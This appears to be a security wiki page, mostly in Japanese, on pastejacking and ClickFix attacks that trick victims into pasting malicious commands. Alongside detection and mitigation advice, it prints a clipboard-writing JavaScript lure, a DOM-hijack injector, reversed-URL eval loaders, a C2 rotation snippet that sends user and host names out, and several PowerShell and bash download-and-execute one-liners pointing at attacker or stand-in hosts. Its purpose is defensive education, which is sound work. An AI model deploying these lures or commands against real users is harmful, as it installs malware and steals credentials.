# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – 古いが今でも有効な助言

## Overview

Clipboard hijacking – *pastejacking* としても知られる – は、ユーザーが内容を確認せずにコマンドをコピー＆ペーストすることが多いという事実を悪用する。悪意のある Web ページ（または Electron や Desktop application のような JavaScript 実行可能な任意のコンテキスト）が、攻撃者制御のテキストをプログラム的に system clipboard に入れる。被害者は、通常は巧妙に作られたソーシャルエンジニアリングの指示によって、**Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）を押すか terminal を開いて clipboard content を *paste* するよう誘導され、即座に任意のコマンドが実行される。

**ファイルはダウンロードされず、添付ファイルも開かれない** ため、この手法は attachment、macro、または direct command execution を監視する多くの e-mail および web-content security controls を回避する。そのためこの攻撃は、NetSupport RAT、Latrodectus loader、Lumma Stealer のような commodity malware families を配布する phishing campaigns でよく使われる。

## Wallet-address replacement clippers

別の **clipboard hijacking** 変種は、コマンドを貼り付けるのではなく、被害者が **cryptocurrency wallet address** をコピーするのを待ち、その直前に攻撃者制御のアドレスへ静かに差し替える。これは特に長い wallet formats に対して有効で、ユーザーは先頭/末尾の文字しか確認しないことが多い。

実世界でよく見られる特徴:
- **Thin loader + nested payload**: 表示される app/exe は正規の trading や "profit" ツールのように見えるが、実際の clipper は bundle のより深い場所に隠されている（たとえば .NET loader が nested Rust payload を起動する）。
- **Regex-driven replacement**: malware は `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...` のような文字列、あるいは一般的な **44-character Solana-like** 文字列までをマッチさせ、攻撃者の wallet に書き換える。
- **Wallet rotation at scale**: 現代の Windows サンプルは、単一の静的アドレスではなく、通貨ごとに **何千もの** 置換用 wallet を埋め込むことがあり、各盗難後の wallet reputation burn を抑える。

### Windows clipper flow

よくある実装は、**`AddClipboardFormatListener`** で登録された hidden window である。clipboard update のたびに、malware は通常次を呼び出す:
- **`OpenClipboard`** → 現在の clipboard data にアクセスする。
- **`GetClipboardData`** → テキストを読み取る。
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string を攻撃者の値に置き換える。

clippers でよく見られる最小限の hunting regexes:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
ユーザーレベルの永続化で十分に影響が出る。観測されたパターンの1つは:
- ペイロードを **`%APPDATA%\silke\silke.exe`**
- **Startup-folder LNK** を `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` に作成

検知アイデア:
- クリップボードAPIを継続的に呼び出しつつ、同時に `%APPDATA%` とユーザーの **Startup** folder に書き込むプロセス。
- 新しい LNK/実行ファイル作成の後に wallet-address の clipboard rewrites が続く。
- 多数の未使用ファイルと、ネストされた binary を起動する小さな launcher を含む archive や偽ソフトウェアの bundle。

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS では、いくつかの campaign が **`unlocker.command`** helper を配布し、Gatekeeper がアプリを damaged または unidentified developer 由来だと言った場合に、被害者へ右クリック → **Open** を指示する。スクリプトは単純に quarantine を削除し、近くの `.app` を起動する:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
古いキャンペーンでは `document.execCommand('copy')` が使われていましたが、最近のものは非同期の **Clipboard API** (`navigator.clipboard.writeText`) に依存しています。

## The ClickFix / ClearFake Flow

1. ユーザーが typo squatting されたサイトや侵害されたサイトを訪問する（例: `docusign.sa[.]com`）
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64 エンコードされた PowerShell の one-liner を clipboard に静かに保存する。
3. HTML の指示が被害者に次の操作を促す: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意のある DLL を含む archive をダウンロードする（典型的な DLL sideloading）。
5. loader が追加ステージを復号し、shellcode を inject して persistence をインストールする（例: scheduled task） – 最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (正規の Java WebStart) は自身のディレクトリで `msvcp140.dll` を検索する。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** 経由で 2 つのバイナリ (`data_3.bin`, `data_4.bin`) をダウンロードし、ローリング XOR キー `"https://google.com/"` を使ってそれらを復号し、最終的な shellcode を注入し、**client32.exe** (NetSupport RAT) を `C:\ProgramData\SecurityCheck_v1\` に展開する。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `curl.exe` で `la.txt` をダウンロード
2. **cscript.exe** 内で JScript ダウンローダーを実行
3. MSI ペイロードを取得 → 署名済みアプリケーションの横に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus.

### MSHTA 経由の Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** の呼び出しは、`PartyContinued.exe` を取得し、`Boat.pst` (CAB) を展開し、`extrac32` とファイル結合を通じて `AutoIt3.exe` を再構築し、最後に `.a3x` スクリプトを実行してブラウザの認証情報を `sumeriavgv.digital` に exfiltrates する hidden PowerShell script を起動する。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部の ClickFix campaign はファイルのダウンロードを完全に省略し、被害者に WSH 経由で JavaScript を取得して実行し、それを persistent にし、C2 を毎日 rotate する one-liner を paste するよう指示する。観測された chain の例:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主要な特徴
- 難読化されたURLは実行時に逆順へ戻され、軽い確認では見抜けないようになっている。
- JavaScriptは Startup LNK (WScript/CScript) を介して自身を永続化し、現在の日付に応じてC2を選択することで、迅速なドメインローテーションを可能にする。

日付でC2を切り替えるために使われる最小のJS断片:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では、通常、永続化を確立し RAT（例: PureHVNC）を取得する loader を展開し、TLS をハードコードされた証明書に pinning して、トラフィックを chunking することが多いです。

この変種に特有の検知アイデア
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（または `cscript.exe`）。
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 内の、`%TEMP%`/`%APPDATA%` 配下の JS path を使って WScript/CScript を呼び出す LNK。
- Registry/RunMRU と command-line telemetry に、`.split('').reverse().join('')` または `eval(a.responseText)` が含まれる。
- 長い command line を使わずに長い scripts を投入するための、巨大な stdin payload を伴う `powershell -NoProfile -NonInteractive -Command -` の繰り返し。
- その後、`regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のような LOLBins を、updater 風の task/path（例: `\GoogleSystem\GoogleUpdater`）の下で実行する Scheduled Tasks。

Threat hunting
- 日次でローテーションする C2 hostnames と URLs で、`.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern を持つもの。
- clipboard write events の後に Win+R paste が続き、その直後に `powershell.exe` execution が発生するものを相関付ける。


Blue-teams は clipboard、process-creation、registry telemetry を組み合わせて pastejacking abuse を特定できます:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** commands の履歴を保持します – 不自然な Base64 / obfuscated entries を探してください。
* Security Event ID **4688** (Process Creation) で、`ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれるもの。
* Event ID **4663** で、疑わしい 4688 event の直前に `%LocalAppData%\Microsoft\Windows\WinX\` または temporary folders 配下で作成された file。
* EDR clipboard sensors（ある場合）– `Clipboard Write` の直後に新しい PowerShell process が続くものを相関付ける。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近の campaigns は、偽の CDN/browser verification pages（"Just a moment…", IUAM-style）を大量生成し、ユーザーに clipboard から OS-specific commands を native consoles に copy させます。これにより execution は browser sandbox の外へ移り、Windows と macOS の両方で機能します。

builder-generated pages の主な特徴
- `navigator.userAgent` による OS detection で payloads を調整（Windows PowerShell/CMD vs. macOS Terminal）。対応外 OS には optional decoys/no-ops を表示して見せかけを維持。
- 見た目の text と clipboard content が異なる場合がある中で、無害な UI actions（checkbox/Copy）により自動的に clipboard-copy する。
- mobile blocking と、手順を示す popover: Windows → Win+R→paste→Enter; macOS → Terminal を開く→paste→Enter。
- Optional obfuscation と single-file injector により、侵害済み site の DOM を Tailwind-styled verification UI で上書きする（新規 domain registration は不要）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOSの初回実行時の永続化
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使うと、ターミナルを閉じた後も実行が継続し、目に見える痕跡を減らせます。

侵害されたサイト上でのインプレースページ乗っ取り
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- IUAMスタイルの lure に特有の Detection と hunting ideas
- Web: Clipboard API を verification widgets に bind するページ; 表示テキストと clipboard payload の不一致; `navigator.userAgent` による分岐; 疑わしいコンテキストでの Tailwind + single-page replace。
- Windows endpoint: ブラウザ操作の直後に `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` から実行される batch/MSI installers。
- macOS endpoint: Terminal/iTerm がブラウザイベントの近くで `bash`/`curl`/`base64 -d` と `nohup` を起動; terminal close 後も生き残る background jobs。
- `RunMRU` の Win+R history と clipboard writes を、その後の console process creation と相関させる。

サポート技術も参照

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake は引き続き WordPress sites を compromise し、loader JavaScript を inject して external hosts (Cloudflare Workers, GitHub/jsDelivr) をチェーンし、さらに blockchain の “etherhiding” calls（例: Binance Smart Chain API endpoints への POST。たとえば `bsc-testnet.drpc[.]org`）まで使って current lure logic を取得する。最近の overlay は、何かを download させる代わりに、ユーザーへ一行の copy/paste（T1204.004）を指示する fake CAPTCHAs を多用している。
- Initial execution は increasingly signed script hosts/LOLBAS に委任される。2026年1月の chains では、以前の `mshta` の使用が、`WScript.exe` 経由で実行される built-in の `SyncAppvPublishingServer.vbs` に置き換えられ、PowerShell-like arguments に aliases/wildcards を渡して remote content を fetch していた:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` は署名済みで、通常は App-V で使用される; `WScript.exe` と不審な引数（`gal`/`gcm` エイリアス、ワイルドカード付き cmdlets、jsDelivr URLs）と組み合わさると、ClearFake のための高シグナルな LOLBAS ステージになる。
- 2026年2月の fake CAPTCHA payloads は、純粋な PowerShell download cradles に戻った。2つの live examples:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 最初のチェーンはインメモリの `iex(irm ...)` グラバーで、2つ目は `WinHttp.WinHttpRequest.5.1` 経由でステージングし、一時的な `.ps1` を書き込み、その後 `-ep bypass` を付けて隠しウィンドウで起動します。

これらのバリアントの検知/ハンティングのヒント
- プロセス系統: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`、または clipboard 書き込み/Win+R の直後に PowerShell のクレードル。
- コマンドラインのキーワード: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker のドメイン、または raw IP の `iex(irm ...)` パターン。
- ネットワーク: Web 閲覧直後に、script hosts/PowerShell から CDN worker host や blockchain RPC エンドポイントへの外向き通信。
- ファイル/レジストリ: `%TEMP%` 配下での一時 `.ps1` 作成と、これらのワンライナーを含む RunMRU エントリ; 外部 URL や難読化された alias 文字列を伴う署名済みスクリプトの LOLBAS (WScript/cscript/mshta) 実行をブロック/アラート。

## Mitigations

1. Browser hardening – clipboard write-access（`dom.events.asyncClipboard.clipboardItem` など）を無効化する、またはユーザー操作を必須にする。
2. Security awareness – ユーザーに機微なコマンドは *入力する* か、まずテキストエディタに貼り付けるよう教える。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control で任意のワンライナーをブロックする。
4. Network controls – 既知の pastejacking および malware C2 ドメインへの外向きリクエストをブロックする。

## Related Tricks

* **Discord Invite Hijacking** は、悪意あるサーバーに誘導した後、同じ ClickFix アプローチを悪用することがよくあります:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
